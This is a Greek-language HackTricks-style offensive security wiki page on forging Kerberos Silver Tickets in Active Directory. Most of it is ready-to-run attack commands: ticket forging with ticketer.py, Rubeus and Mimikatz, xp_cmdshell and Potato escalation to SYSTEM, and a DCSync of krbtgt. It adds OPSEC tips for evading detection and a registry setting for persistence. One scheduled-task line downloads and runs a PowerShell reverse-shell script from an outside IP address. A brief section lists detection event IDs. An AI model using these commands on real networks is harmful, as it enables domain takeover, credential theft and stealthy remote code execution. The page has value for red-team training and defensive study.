# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Η επίθεση **Silver Ticket** περιλαμβάνει την εκμετάλλευση των service tickets σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην **απόκτηση του NTLM hash ενός service account**, όπως ενός computer account, για να πλαστογραφήσει ένα Ticket Granting Service (TGS) ticket. Με αυτό το πλαστογραφημένο ticket, ένας επιτιθέμενος μπορεί να αποκτήσει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, **παριστάνοντας οποιονδήποτε χρήστη**, συνήθως επιδιώκοντας προνόμια διαχειριστή. Επισημαίνεται ότι η χρήση AES keys για την πλαστογράφηση tickets είναι πιο ασφαλής και λιγότερο ανιχνεύσιμη.

> [!WARNING]
> Τα Silver Tickets είναι λιγότερο ανιχνεύσιμα από τα Golden Tickets επειδή απαιτούν μόνο το **hash του service account**, όχι το krbtgt account. Ωστόσο, είναι περιορισμένα στην συγκεκριμένη υπηρεσία που στοχεύουν. Επιπλέον, απλώς κλέβοντας τον κωδικό ενός χρήστη.
> Επιπλέον, αν παραβιάσετε τον **κωδικό ενός account που έχει SPN** μπορείτε να χρησιμοποιήσετε αυτόν τον κωδικό για να δημιουργήσετε ένα Silver Ticket που παριστάνει οποιοδήποτε χρήστη σε εκείνη την υπηρεσία.

### Modern Kerberos changes (AES-only domains)

- Οι ενημερώσεις των Windows από **8 Nov 2022 (KB5021131)** θέτουν από προεπιλογή τα service tickets σε **AES session keys** όπου είναι δυνατό και σταδιακά αποσύρουν το RC4. DCs αναμένεται να παραδίδονται με RC4 **απενεργοποιημένο από προεπιλογή έως τα μέσα‑2026**, οπότε η εξάρτηση από NTLM/RC4 hashes για silver tickets αποτυγχάνει όλο και περισσότερο με `KRB_AP_ERR_MODIFIED`. Πάντοτε εξάγετε τα **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) για το service account στόχου.
- Εάν το service account `msDS-SupportedEncryptionTypes` είναι περιορισμένο σε AES, πρέπει να πλαστογραφήσετε με `/aes256` ή `-aesKey`; το RC4 (`/rc4` ή `-nthash`) δεν θα λειτουργήσει ακόμα κι αν κατέχετε το NTLM hash.
- Οι gMSA/computer accounts εναλλάσσονται κάθε 30 ημέρες· κάνετε dump το **τρέχον AES key** από LSASS, Secretsdump/NTDS, ή DCsync πριν από την πλαστογράφηση.
- OPSEC: το προεπιλεγμένο διάστημα ζωής ticket σε εργαλεία είναι συχνά **10 years**· ορίστε ρεαλιστικές διάρκειες (π.χ. `-duration 600` minutes) για να αποφύγετε ανίχνευση λόγω μη φυσιολογικών διαρκείας.

Για την κατασκευή tickets, χρησιμοποιούνται διαφορετικά εργαλεία ανάλογα με το λειτουργικό σύστημα:

### Σε Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Σε Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Η υπηρεσία CIFS επισημαίνεται ως κοινός στόχος για πρόσβαση στο σύστημα αρχείων του θύματος, αλλά άλλες υπηρεσίες όπως HOST και RPCSS μπορούν επίσης να εκμεταλλευτούν για εργασίες και ερωτήματα WMI.

### Παράδειγμα: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Εάν έχετε το NTLM hash (ή AES key) ενός SQL service account (π.χ. sqlsvc), μπορείτε να forge a TGS για το MSSQL SPN και να impersonate οποιονδήποτε user προς την SQL service. Από εκεί, ενεργοποιήστε το xp_cmdshell για να εκτελέσετε εντολές ως ο SQL service account. Αν αυτό το token έχει SeImpersonatePrivilege, chain a Potato για να elevate σε SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Εάν το προκύπτον πλαίσιο έχει SeImpersonatePrivilege (συχνά ισχύει για λογαριασμούς υπηρεσίας), χρησιμοποιήστε μια παραλλαγή του Potato για να αποκτήσετε SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Περισσότερες λεπτομέρειες για την κατάχρηση του MSSQL και την ενεργοποίηση του xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Διαθέσιμες Υπηρεσίες

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το λειτουργικό, επίσης:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Σε κάποιες περιπτώσεις μπορείτε απλά να ζητήσετε: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Χρησιμοποιώντας το **Rubeus** μπορείς **να ζητήσεις όλα** αυτά τα tickets χρησιμοποιώντας την παράμετρο:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets — Κωδικοί συμβάντων

- 4624: Σύνδεση λογαριασμού
- 4634: Αποσύνδεση λογαριασμού
- 4672: Σύνδεση διαχειριστή
- **No preceding 4768/4769 on the DC** για τον ίδιο client/service είναι ένα κοινό δείγμα ότι ένα πλαστό TGS παρουσιάζεται απευθείας στην υπηρεσία.
- Αφύσικα μεγάλος χρόνος ζωής του ticket ή απροσδόκητος τύπος κρυπτογράφησης (RC4 όταν το domain επιβάλλει AES) επίσης ξεχωρίζουν στα δεδομένα 4769/4624.

## Persistence

Για να αποφύγετε τις μηχανές από την περιστροφή του κωδικού τους κάθε 30 ημέρες, ορίστε `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ή μπορείτε να ρυθμίσετε την τιμή `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` σε μεγαλύτερη τιμή από 30 ημέρες για να υποδείξετε την περίοδο κατά την οποία ο κωδικός της μηχανής θα πρέπει να περιστραφεί.

## Κατάχρηση Service tickets

Στα ακόλουθα παραδείγματα, ας φανταστούμε ότι το ticket αποκτήθηκε πλαστοπαρουσιάζοντας τον λογαριασμό διαχειριστή.

### CIFS

Με αυτό το ticket θα μπορείτε να αποκτήσετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (αν είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε μέρος του απομακρυσμένου συστήματος αρχείων κάνοντας απλά κάτι σαν:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Θα μπορείτε επίσης να αποκτήσετε ένα shell μέσα στον host ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Με αυτήν την άδεια μπορείτε να δημιουργήσετε scheduled tasks σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα tickets μπορείτε να **εκτελέσετε WMI στο σύστημα του θύματος**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε **περισσότερες πληροφορίες για wmiexec** στην παρακάτω σελίδα:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Με πρόσβαση μέσω winrm σε έναν υπολογιστή μπορείτε να **συνδεθείτε σε αυτόν** και ακόμη να αποκτήσετε ένα PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Δείτε την παρακάτω σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με απομακρυσμένο host χρησιμοποιώντας winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Σημειώστε ότι **winrm πρέπει να είναι ενεργό και να δέχεται συνδέσεις** στον απομακρυσμένο υπολογιστή για να αποκτήσετε πρόσβαση.

### LDAP

Με αυτό το προνόμιο μπορείτε να εξάγετε τη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθετε περισσότερα για το DCSync** στην παρακάτω σελίδα:


{{#ref}}
dcsync.md
{{#endref}}


## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
